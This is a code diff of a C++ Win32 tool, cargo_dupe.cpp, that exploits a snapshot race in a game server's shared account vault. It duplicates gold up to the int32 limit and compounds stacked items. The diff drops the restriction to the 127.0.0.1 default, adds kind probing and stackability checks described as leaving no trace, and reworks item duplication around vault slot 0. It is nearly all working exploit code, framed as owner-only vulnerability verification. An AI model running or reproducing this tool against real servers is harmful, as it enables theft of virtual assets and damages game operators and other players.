@@ -1,7 +1,7 @@
 // cargo_dupe.cpp
 // cargo_maxexp 的 C++/Win32 图形化版本(独立 TCP 客户端,不需要 hook/DLL 注入)。
 // 用途:验证 ServerS4A21 账号金库(AccountCargo)双角色快照不一致导致的金币/物品复制漏洞。
-// 仅限服务器所有者在自己的环境(默认 127.0.0.1)做漏洞验证。
+// 仅限服务器所有者在自己的环境做漏洞验证。
 //
 // 机制:同账号双角色同时在线,各自持有选角时载入的金库内存快照;账号金库无账号级互斥,
 // 落库无条件覆盖 → 后取者基于陈旧快照再取一次,一份资产发两次。
@@ -16,9 +16,10 @@
 //
 // 功能:
 //   金币复制 —— 两角色金币全部入金库做本金,每轮金库翻倍,复制一次超 int32 即停
-//   物品复制 —— 指定 itemId + 目标数量,整栈复利增长到满栈,之后收割轮每轮净增一整栈
+//   物品复制 —— 直接复制金库槽位 0 的物品到目标数量(需可堆叠):
+//               整栈复利增长到满栈(32767),之后收割轮每轮净增一整栈,产出留金库
 //
-// 界面输入(HOST/端口/账号/密码/物品ID/目标数量)对应可变参数;密码明文输入,
+// 界面输入(HOST/端口/账号/密码/目标数量)对应可变参数;密码明文输入,
 // 发送前本地计算 PBKDF2 hash。执行在后台线程,日志区实时输出每一步。
 
 #ifndef UNICODE
@@ -58,7 +59,6 @@ constexpr int IDC_HOST = 1001;
 constexpr int IDC_PORT = 1002;
 constexpr int IDC_MID = 1003;
 constexpr int IDC_PWD = 1004;
-constexpr int IDC_ITEM = 1005;
 constexpr int IDC_TARGET = 1006;
 constexpr int IDC_MODE_GOLD = 1007;
 constexpr int IDC_MODE_ITEM = 1008;
@@ -72,7 +72,6 @@ HWND g_edHost = nullptr;
 HWND g_edPort = nullptr;
 HWND g_edMid = nullptr;
 HWND g_edPwd = nullptr;
-HWND g_edItem = nullptr;
 HWND g_edTarget = nullptr;
 HWND g_btnRun = nullptr;
 HWND g_btnStop = nullptr;
@@ -86,7 +85,6 @@ struct ExpParams {
     std::wstring mid;
     std::wstring pwd;      // 明文密码,发送前本地计算 PBKDF2 hash
     bool goldMode;
-    long itemId;
     long target;
 };
 
@@ -105,6 +103,7 @@ constexpr uint16_t N_ITEM_LIST = 0x000D;
 
 constexpr int MAIN = 0;
 constexpr int ACCOUNT_CARGO = 12;
+constexpr int CARGO_SLOT = 0;     // 物品复制固定操作金库槽位 0
 constexpr int ENTRY = 101;        // A21CommonEntrySize
 
 constexpr int32_t INT32_MAX_V = 0x7FFFFFFF;
@@ -215,7 +214,6 @@ int32_t GetI32(const std::vector<uint8_t>& b, size_t off) {
 }
 
 // 按 15B 服务端帧头迭代:cmd u8 + type u16 + len u32 + 8B 保留 + body。
-// onFrame(cmd, type, bodyOff, bodyLen);返回 false 中止。
 void IterFrames(const std::vector<uint8_t>& buf,
                 const std::function<bool(uint8_t, uint16_t, size_t, size_t)>& onFrame) {
     size_t i = 0;
@@ -301,6 +299,7 @@ struct Session {
                 }
                 bool gotGold = false;
                 int32_t g = 0;
+                newMain.clear();
                 for (uint16_t k = 0; k < count; ++k) {
                     size_t e = off + 5 + static_cast<size_t>(k) * ENTRY;
                     int16_t sl = GetI16(buf, e);
@@ -373,6 +372,17 @@ struct Session {
     static std::string HostA_;
     static int Port_;
 
+    std::vector<uint8_t> SlotBody() const {
+        return {static_cast<uint8_t>(slot & 0xFF), static_cast<uint8_t>((slot >> 8) & 0xFF)};
+    }
+
+    static std::vector<uint8_t> LoginBody() {
+        std::vector<uint8_t> b = DStr(MidA);
+        std::vector<uint8_t> h = DStr(PwdHashHex);
+        b.insert(b.end(), h.begin(), h.end());
+        return b;
+    }
+
     void Relog() {
         if (s != INVALID_SOCKET) Close();
         if (!ConnectAndLogin()) return;
@@ -396,17 +406,6 @@ struct Session {
     }
 
     void Reload() { Reselect(); }
-
-    std::vector<uint8_t> SlotBody() const {
-        return {static_cast<uint8_t>(slot & 0xFF), static_cast<uint8_t>((slot >> 8) & 0xFF)};
-    }
-
-    static std::vector<uint8_t> LoginBody() {
-        std::vector<uint8_t> b = DStr(MidA);
-        std::vector<uint8_t> h = DStr(PwdHashHex);
-        b.insert(b.end(), h.begin(), h.end());
-        return b;
-    }
 
     // 存/取 ack: 01 + i32 新金库金币(失败 00 0A)
     bool Withdraw(int32_t amount) {
@@ -536,34 +535,6 @@ int KindOfSlot(int slot) {
     return 0;
 }
 
-// 物品位于 main(src_slot)(如快捷槽 3-8,不在标准分区)时,
-// 通过「金库往返 + 逐区间试探目标槽」可逆探测其 kind。全程不留痕。
-// 返回 kind 或 0。探测后调用 Reselect() 重新同步簿记。
-int DetectKind(Session& sess, int srcSlot) {
-    int cs = -1;
-    for (int x = 0; x < 64; ++x) {
-        if (sess.cargoItems.find(x) == sess.cargoItems.end()) { cs = x; break; }
-    }
-    if (cs < 0) return 0;
-    if (!AckOk(sess.Move(MAIN, srcSlot, 1, ACCOUNT_CARGO, cs))) return 0;
-    int kind = 0;
-    for (const auto& [k, range] : KIND_RANGE) {
-        int dst = -1;
-        for (int x = range.first; x <= range.second; ++x) {
-            if (sess.mainItems.find(x) == sess.mainItems.end() && x != srcSlot) { dst = x; break; }
-        }
-        if (dst < 0) continue;
-        if (AckOk(sess.Move(ACCOUNT_CARGO, cs, 1, MAIN, dst))) {
-            kind = k;
-            sess.Move(MAIN, dst, 1, ACCOUNT_CARGO, cs);   // 替回金库
-            break;
-        }
-    }
-    sess.Move(ACCOUNT_CARGO, cs, 1, MAIN, srcSlot);       // 金库那份移回原槽
-    sess.Reselect();
-    return kind;
-}
-
 int EmptyMain(Session& sess, int kind) {
     auto it = KIND_RANGE.find(kind);
     int lo = it != KIND_RANGE.end() ? it->second.first : 3;
@@ -572,6 +543,72 @@ int EmptyMain(Session& sess, int kind) {
         if (sess.mainItems.find(s) == sess.mainItems.end()) return s;
     }
     return -1;
+}
+
+int EmptyCargo(Session& sess, int excludeSlot = -1) {
+    for (int x = 0; x < 64; ++x) {
+        if (x == excludeSlot) continue;
+        if (sess.cargoItems.find(x) == sess.cargoItems.end()) return x;
+    }
+    return -1;
+}
+
+// 从金库槽 cargoSlot 出发的可逆 kind 探测:逐 kind 分区试探主背包空槽,
+// 成功即该分区;成功后把这一份移回金库(合并)。全程不留痕。
+// 返回 kind 或 0(探测失败已 Reselect 同步)。
+int DetectKindFromCargo(Session& sess, int cargoSlot) {
+    int kind = 0;
+    for (const auto& [k, range] : KIND_RANGE) {
+        int dst = -1;
+        for (int x = range.first; x <= range.second; ++x) {
+            if (sess.mainItems.find(x) == sess.mainItems.end()) { dst = x; break; }
+        }
+        if (dst < 0) continue;
+        if (AckOk(sess.Move(ACCOUNT_CARGO, cargoSlot, 1, MAIN, dst))) {
+            kind = k;
+            sess.Move(MAIN, dst, 1, ACCOUNT_CARGO, cargoSlot);   // 移回金库(合并)
+            break;
+        }
+    }
+    sess.Reselect();
+    return kind;
+}
+
+// 可堆叠校验(要求金库该槽数量 ≥2):取两份到两个空槽,尝试合并;
+// 合并成功=可堆叠(两份移回金库),失败=不可堆叠(恢复原状)。
+// 返回 true=可堆叠(已 Reselect 同步);false=不可堆叠或无法检测。
+bool CheckStackable(Session& sess, int cargoSlot, int kind) {
+    int x = EmptyMain(sess, kind);
+    if (x < 0) return false;
+    if (!AckOk(sess.Move(ACCOUNT_CARGO, cargoSlot, 1, MAIN, x))) return false;
+    int y = EmptyMain(sess, kind);
+    if (y < 0) {
+        sess.Move(MAIN, x, 1, ACCOUNT_CARGO, cargoSlot);
+        sess.Reselect();
+        return false;
+    }
+    if (!AckOk(sess.Move(ACCOUNT_CARGO, cargoSlot, 1, MAIN, y))) {
+        sess.Move(MAIN, x, 1, ACCOUNT_CARGO, cargoSlot);
+        sess.Reselect();
+        return false;
+    }
+    if (AckOk(sess.Move(MAIN, x, 1, MAIN, y))) {
+        // 可堆叠:y 现有 2 份,一起移回金库合并
+        sess.Move(MAIN, y, 2, ACCOUNT_CARGO, cargoSlot);
+        sess.Reselect();
+        return true;
+    }
+    // 不可堆叠:两份分别放回原金库槽 / 空金库槽,恢复原状
+    if (!AckOk(sess.Move(MAIN, x, 1, ACCOUNT_CARGO, cargoSlot))) {
+        int cs = EmptyCargo(sess, cargoSlot);
+        if (cs >= 0) sess.Move(MAIN, x, 1, ACCOUNT_CARGO, cs);
+    }
+    {
+        int cs = EmptyCargo(sess, cargoSlot);
+        if (cs >= 0) sess.Move(MAIN, y, 1, ACCOUNT_CARGO, cs);
+    }
+    sess.Reselect();
+    return false;
 }
 
 // 金库 -> 主背包,返回主背包真实落点槽位(解析 ack 归一化);失败返回 -1。含簿记。
@@ -626,10 +663,15 @@ void RunGold(int32_t target) {
     Session& A = *ss[0];
     Session& B = *ss[1];
 
-    LogFmt(L"[setup] CREATE_ACCOUNT_CARGO: %s",
-           A.CreateCargo() ? L"ok" : L"fail(可能已存在)");
-    A.Relog();
-    Sleep(300);
+    // 金库已存在(选角序列带了 AccountCargo 列表)则跳过开通
+    if (A.stateFresh) {
+        LogLine(L"[setup] 金库已存在,跳过开通");
+    } else {
+        LogFmt(L"[setup] CREATE_ACCOUNT_CARGO: %s",
+               A.CreateCargo() ? L"ok" : L"fail(检查金币是否够 10 万)");
+        A.Relog();
+        Sleep(300);
+    }
 
     // 效率优先:把两个角色的金币全部存入金库,作为复利初始本金
     for (Session* s : {&A, &B}) {
@@ -686,73 +728,48 @@ void RunGold(int32_t target) {
 }
 
 // ---------------------------------------------------------------------------
-// 物品:整栈复利复制
+// 物品:整栈复利复制(固定金库槽位 0,需可堆叠)
 // ---------------------------------------------------------------------------
-void RunItem(int32_t iid, int32_t target) {
+void RunItem(int32_t target) {
     auto ss = EnsureTwoSessions();
     if (ss.size() < 2) return;
+    Session* A = ss[0].get();
+    Session* B = ss[1].get();
 
-    // 找物品所在角色:A=持有物品的角色,B=另一个
-    Session* A = nullptr;
-    int slotSrc = -1;
-    int32_t have = 0;
-    for (auto& s : ss) {
-        for (const auto& [slot, st] : s->mainItems) {
-            if (st.iid == iid && st.count > 0) {
-                A = s.get();
-                slotSrc = slot;
-                have = st.count;
-                break;
-            }
-        }
-        if (A) break;
-    }
-    if (!A) {
-        LogFmt(L"[item] 两个角色背包里都找不到 itemId=%d,无法播种", iid);
+    // 目标:金库槽位 0,为空则拒绝
+    auto it0 = A->cargoItems.find(CARGO_SLOT);
+    if (it0 == A->cargoItems.end() || it0->second.count <= 0) {
+        LogLine(L"[item] 金库槽位 0 为空,拒绝复制(请先在游戏内把要复制的物品放入金库槽位 1)");
         return;
     }
-    Session* B = (ss[0].get() == A) ? ss[1].get() : ss[0].get();
+    int32_t iid = it0->second.iid;
+    int32_t have = it0->second.count;
+    LogFmt(L"[item] 目标:金库槽位 0 itemId=%d 数量 %d", iid, have);
 
-    int kind = KindOfSlot(slotSrc);
+    // kind 探测(从金库出发,可逆)
+    int kind = DetectKindFromCargo(*A, CARGO_SLOT);
     if (kind == 0) {
-        LogFmt(L"[item] 槽位 %d 不在标准分区(如快捷槽 3-8),改用可逆探测确定 kind...", slotSrc);
-        kind = DetectKind(*A, slotSrc);
-        if (kind == 0) {
-            LogLine(L"[item] 探测失败: 该物品可能不允许入金库,或无可用目标分区");
-            return;
-        }
-        LogFmt(L"[item] 探测得 kind=%d", kind);
-        B->Reselect();
+        LogLine(L"[item] kind 探测失败: 背包各分区均无空槽");
+        return;
     }
-    LogFmt(L"[item] 目标 itemId=%d kind=%d slot%d main%d 现有 %d", iid, kind, A->slot,
-           slotSrc, have);
-    LogFmt(L"[item] 当前金库物品 %zu 件", A->cargoItems.size());
+    LogFmt(L"[item] 探测得 kind=%d(区间 %d-%d)", kind, KIND_RANGE[kind].first,
+           KIND_RANGE[kind].second);
+    B->Reselect();
 
-    // 播种:金库已有该物品直接用;否则找空金库槽位,把物品移入(≥1 份)
-    int cargoSlot = -1;
-    for (const auto& [slot, st] : A->cargoItems) {
-        if (st.iid == iid && st.count > 0) {
-            cargoSlot = slot;
-            LogFmt(L"[item] 金库已有该物品 x%d(槽位 %d),直接作为起点", st.count, slot);
-            break;
-        }
-    }
-    if (cargoSlot < 0) {
-        for (int x = 0; x < 64; ++x) {
-            if (A->cargoItems.find(x) == A->cargoItems.end()) { cargoSlot = x; break; }
-        }
-        if (cargoSlot < 0) {
-            LogLine(L"[item] 金库 64 个槽位全满,无法播种");
+    // 可堆叠校验(数量≥2 时可逆检测;数量==1 由增长轮停滞保护兜底)
+    if (have >= 2) {
+        if (!CheckStackable(*A, CARGO_SLOT, kind)) {
+            LogLine(L"[item] 该物品不可堆叠,拒绝复制(复制机制依赖堆叠合并)");
             return;
         }
-        int32_t n = (std::min)(have, (std::min)(STACK_CAP, target));
-        if (!PutToCargo(*A, iid, slotSrc, n, cargoSlot)) {
-            LogLine(L"[item] 播种失败(该物品可能不允许入金库)");
-            return;
-        }
-        LogFmt(L"[item] 播种: slot%d main%d -> 金库槽%d x%d", A->slot, slotSrc, cargoSlot, n);
+        LogLine(L"[item] 可堆叠校验通过");
+        auto it = A->cargoItems.find(CARGO_SLOT);
+        if (it != A->cargoItems.end()) have = it->second.count;
+    } else {
+        LogLine(L"[item] 数量仅 1,跳过可堆叠预检(由增长轮停滞保护兜底)");
     }
 
+    const int cargoSlot = CARGO_SLOT;
     auto cargoCount = [&](Session* s) -> int32_t {
         auto it = s->cargoItems.find(cargoSlot);
         return it != s->cargoItems.end() ? it->second.count : 0;
@@ -768,6 +785,7 @@ void RunItem(int32_t iid, int32_t target) {
     };
 
     // ---- 增长轮:金库 C → C+step(取 2×step 放 2×step,一份留存为净增) ----
+    // step 约束:step ≤ C(各自快照)、C+step ≤ 32767(B 放回合并不炸栈)、C+step ≤ target
     int cycle = 0;
     int32_t prevC = -1;
     int stall = 0;
@@ -783,7 +801,7 @@ void RunItem(int32_t iid, int32_t target) {
                 B->Relog();
                 continue;
             }
-            LogLine(L"[item] 重登后金库值仍无增长,终止");
+            LogLine(L"[item] 重登后金库值仍无增长,终止(该物品可能不可堆叠)");
             break;
         }
         stall = 0;
@@ -861,13 +879,13 @@ DWORD WINAPI ExpThread(LPVOID param) {
     Session::PwdHashHex = a21hash::Derive(midA, pwdA);
 
     LogFmt(L"[*] 目标 %s:%d  账号 %s  模式 %s", prm.host.c_str(), prm.port,
-           prm.mid.c_str(), prm.goldMode ? L"金币复制(拉到上限)" : L"物品复制");
+           prm.mid.c_str(), prm.goldMode ? L"金币复制(拉到上限)" : L"物品复制(金库槽位 0)");
     LogFmt(L"[*] derived hash: %S", Session::PwdHashHex.c_str());
 
     if (prm.goldMode) {
         RunGold(INT32_MAX_V / 2);
     } else {
-        RunItem(static_cast<int32_t>(prm.itemId), static_cast<int32_t>(prm.target));
+        RunItem(static_cast<int32_t>(prm.target));
     }
 
     WSACleanup();
@@ -923,17 +941,15 @@ void CreateControls(HWND hwnd) {
                                  10, 44, 160, 22, hwnd,
                                  reinterpret_cast<HMENU>(IDC_MODE_GOLD), g_hinst, nullptr);
     SendMessageW(rGold, WM_SETFONT, reinterpret_cast<WPARAM>(font), TRUE);
-    HWND rItem = CreateWindowExW(0, L"BUTTON", L"物品复制",
+    HWND rItem = CreateWindowExW(0, L"BUTTON", L"物品复制(金库槽位 1)",
                                  WS_CHILD | WS_VISIBLE | BS_AUTORADIOBUTTON,
-                                 10, 68, 90, 22, hwnd,
+                                 10, 68, 160, 22, hwnd,
                                  reinterpret_cast<HMENU>(IDC_MODE_ITEM), g_hinst, nullptr);
     SendMessageW(rItem, WM_SETFONT, reinterpret_cast<WPARAM>(font), TRUE);
     SendMessageW(rGold, BM_SETCHECK, BST_CHECKED, 0);
 
-    label(180, 71, 55, L"物品ID:");
-    g_edItem = edit(230, 68, 100, L"29692", IDC_ITEM);
-    label(340, 71, 70, L"目标数量:");
-    g_edTarget = edit(410, 68, 80, L"32767", IDC_TARGET);
+    label(180, 71, 70, L"目标数量:");
+    g_edTarget = edit(250, 68, 80, L"32767", IDC_TARGET);
 
     g_btnRun = CreateWindowExW(0, L"BUTTON", L"开始",
                                WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
@@ -962,7 +978,6 @@ void RunExp() {
         GetEditText(g_edMid),
         GetEditText(g_edPwd),
         SendMessageW(GetDlgItem(g_hwnd, IDC_MODE_GOLD), BM_GETCHECK, 0, 0) == BST_CHECKED,
-        GetEditInt(g_edItem, 29692),
         GetEditInt(g_edTarget, 32767),
     };
     if (p->host.empty() || p->mid.empty() || p->pwd.empty()) {
